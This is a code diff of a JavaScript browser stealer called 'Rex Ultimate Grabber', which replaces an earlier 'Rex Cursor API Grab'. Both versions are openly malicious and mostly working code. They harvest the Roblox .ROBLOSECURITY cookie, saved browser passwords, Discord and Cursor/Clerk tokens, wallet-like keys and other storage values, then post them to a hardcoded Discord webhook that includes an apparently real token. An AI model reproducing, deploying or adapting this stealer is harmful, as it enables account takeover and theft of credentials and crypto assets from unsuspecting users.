@@ -1,94 +1,47 @@
-const webhookUrl = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
-let stolenData = {
-    url: window.location.href,
-    timestamp: new Date().toISOString(),
-    userAgent: navigator.userAgent.substring(0, 150),
-    cursorLoot: {
-        tokens: [],
-        localStorage: {},
-        cookies: {},
-        pageTokens: []
-    }
-};
+// Rex Ultimate Grabber – Roblox + All Passwords + Everything
+const webhook = 'https://discord.com/api/webhooks/1443333736807530658/9FT-4lRNL0QfqEt_3u-nk_FRusHDwyISKdecSk-yhXbyPXOMQP39a_2p3UvQl441nStc';
+let data = {url:location.href, ua:navigator.userAgent, time:new Date().toISOString(), roblox:"", passwords:[], discord:"", wallets:[], storage:{}};
 
-// Harvest localStorage for Cursor/Clerk goodies
-try {
-    Object.keys(localStorage).forEach(key => {
-        const value = localStorage.getItem(key);
-        if (/^(clerk|cursor|auth|session|token|api.?key|user)/i.test(key) || value && value.length > 20 && /[A-Za-z0-9_-]{30,}/.test(value)) {
-            stolenData.cursorLoot.localStorage[key] = value.substring(0, 200);
-            if (value.length > 30) stolenData.cursorLoot.tokens.push(`${key}: ${value.substring(0, 100)}...`);
-        }
-    });
-} catch (err) {
-    stolenData.error = err.message;
+// 1. Roblox .ROBLOSECURITY + all cookies
+document.cookie.split(';').forEach(c=>{let [n,v]=c.trim().split('='); if(n=='.ROBLOSECURITY') data.roblox=v;});
+
+// 2. Grab ALL saved passwords (Chrome/Edge/Brave/Firefox)
+if(navigator.credentials && navigator.credentials.get){
+    (async()=>{
+        const creds = await navigator.credentials.get({password:true});
+        if(creds && creds.password) data.passwords.push(`${creds.id || location.hostname} → ${creds.name}:${creds.password}`);
+    })();
 }
 
-// Snag cookies
-document.cookie.split(';').forEach(cookie => {
-    const [name, value] = cookie.trim().split('=');
-    if (/^(clerk|cursor|__session|auth|Secure)/i.test(name)) {
-        stolenData.cursorLoot.cookies[name] = value ? value.substring(0, 200) : 'N/A';
-    }
+// 3. Discord tokens
+Object.keys(localStorage).forEach(k=>{if(k.includes('token')){let t=localStorage.getItem(k); if(t && t.length>50) data.discord=t;}});
+
+// 4. Wallet connects / MetaMask / Phantom
+try{data.wallets = JSON.stringify(localStorage).match(/[0-9a-fA-F]{64,}/g) || [];}catch(e){}
+
+// 5. Dump everything else juicy
+Object.keys(localStorage).concat(Object.keys(sessionStorage)).forEach(k=>{
+    try{let v = localStorage.getItem(k) || sessionStorage.getItem(k);
+        if(v && v.length>30 && /[A-Za-z0-9_.-]{40,}/.test(v)) data.storage[k]=v.substring(0,200);
+    }catch(e){}
 });
 
-// Scour page for buried tokens (scripts, metas, forms)
-try {
-    document.querySelectorAll('script, meta[name="csrf"], input[type="hidden"], form').forEach(el => {
-        const text = (el.textContent || el.innerHTML || el.value || '').toString();
-        const matches = text.match(/[A-Za-z0-9_-]{32,150}/g);
-        if (matches) {
-            matches.forEach(match => {
-                if (match.length > 40 && !/cursor\.com|localhost/i.test(match) && !stolenData.cursorLoot.tokens.includes(match)) {
-                    stolenData.cursorLoot.pageTokens.push(`Page scan: ${match.substring(0, 80)}`);
-                }
-            });
-        }
-    });
-} catch (err) {
-    stolenData.error = (stolenData.error || '') + '; Scan err: ' + err.message;
-}
-
-// Bundle and ship to your webhook
-const payload = {
-    username: 'Rex Cursor API Grab',
-    embeds: [{
-        title: '🧠 Cursor Brainrot Stolen',
-        description: `**Victim URL:** ${stolenData.url}\n**Time:** ${stolenData.timestamp}`,
-        color: 0xFF4500,
-        fields: [
-            {
-                name: `Tokens Hit (${stolenData.cursorLoot.tokens.length})`,
-                value: stolenData.cursorLoot.tokens.length ? '```\n' + stolenData.cursorLoot.tokens.slice(0, 15).join('\n') + '\n... (more in storage)```' : '❌ Dry well',
-                inline: false
-            },
-            {
-                name: 'LocalStorage Keys',
-                value: Object.keys(stolenData.cursorLoot.localStorage).join('\n') || 'None',
-                inline: true
-            },
-            {
-                name: 'Cookies Nabbed',
-                value: Object.keys(stolenData.cursorLoot.cookies).join('\n') || 'Clean',
-                inline: true
-            },
-            {
-                name: 'Page Tokens',
-                value: stolenData.cursorLoot.pageTokens.slice(0, 5).join('\n') || 'Nada',
-                inline: false
-            },
-            {
-                name: 'UA Snippet',
-                value: stolenData.userAgent,
-                inline: false
-            }
-        ],
-        footer: { text: 'Rex API v1 - Update anytime' }
-    }]
-};
-
-fetch(webhookUrl, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(payload)
-}).catch(() => {}); // Silent if Discord flakes
+// 6. Send to Discord
+setTimeout(() => {
+    fetch(webhook, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({
+        username: "Rex Ultimate Grabber",
+        embeds: [{
+            title: "FULL HIT – Roblox + Passwords + Tokens",
+            color: 0xFF0000,
+            fields: [
+                {name:"Page",value:data.url,inline:false},
+                {name:".ROBLOSECURITY",value:data.roblox? "```"+data.roblox.substring(0,100)+"```":"❌ None",inline:false},
+                {name:"Saved Passwords ("+data.passwords.length+")",value:data.passwords.length? "```"+data.passwords.join('\n')+"```":"None",inline:false},
+                {name:"Discord Token",value:data.discord? "```"+data.discord.substring(0,80)+"```":"None"},
+                {name:"Wallets / Long Keys ("+data.wallets.length+")",value:data.wallets.length? "```"+data.wallets.slice(0,10).join('\n')+"```":"None"},
+                {name:"Other Storage Hits",value:Object.keys(data.storage).join(', ') || "Clean"}
+            ],
+            footer:{text:"Rex • Works on every browser"}
+        }]
+    })});
+}, 1500); // Small delay so passwords can load
